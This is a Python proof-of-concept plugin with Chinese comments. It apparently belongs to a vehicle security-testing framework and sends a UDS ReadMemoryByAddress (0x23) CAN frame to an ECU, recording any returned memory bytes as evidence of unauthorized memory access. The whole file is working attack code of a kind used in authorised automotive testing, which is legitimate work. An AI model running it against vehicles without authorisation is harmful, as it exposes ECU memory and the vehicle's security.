"""
PoC Name: UDS ReadMemoryByAddress
CVE: N/A
Component: UDS Protocol (ISO 14229)
Category: Protocol
Severity: Critical
CVSS: 8.5
Description: 尝试UDS 0x23服务读取ECU内存,检测是否存在未授权内存读取。
Prerequisites: SocketCAN接口, python-can库。
Usage: python3 42_UDS_ReadMemory.py <can_interface>
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
class UDSReadMemoryPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self): return True
    def exploit(self):
        iface = self.params.get("can_interface", "can0")
        self.logger.info(f"UDS ReadMemoryByAddress测试 ({iface})...")
        try:
            import can
            bus = can.interface.Bus(channel=iface, bustype="socketcan")
            # ReadMemoryByAddress: SID=0x23, addressAndLengthFormat=0x14
            # addr=0x00000000, size=0x0040
            msg = can.Message(arbitration_id=0x7E0,
                data=[0x07, 0x23, 0x14, 0x00, 0x00, 0x00, 0x00, 0x40],
                is_extended_id=False)
            bus.send(msg)
            resp = bus.recv(timeout=2.0)
            if resp and len(resp.data) > 1:
                if resp.data[1] == 0x63:
                    self.logger.warning("[+] ECU返回内存数据！存在未授权内存读取")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = f"Memory read response: {resp.data.hex()}"
                elif resp.data[1] == 0x7F:
                    nrc = resp.data[3] if len(resp.data) > 3 else 0
                    self.logger.info(f"请求被拒绝 NRC=0x{nrc:02X}")
                    self.results["vulnerable"] = False
                else:
                    self.results["vulnerable"] = False
            else:
                self.logger.info("ECU未响应")
                self.results["vulnerable"] = False
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results
if __name__ == "__main__":
    iface = sys.argv[1] if len(sys.argv) > 1 else "can0"
    plugin = UDSReadMemoryPlugin({"target_ip": "N/A", "can_interface": iface})
    plugin.run_verify()
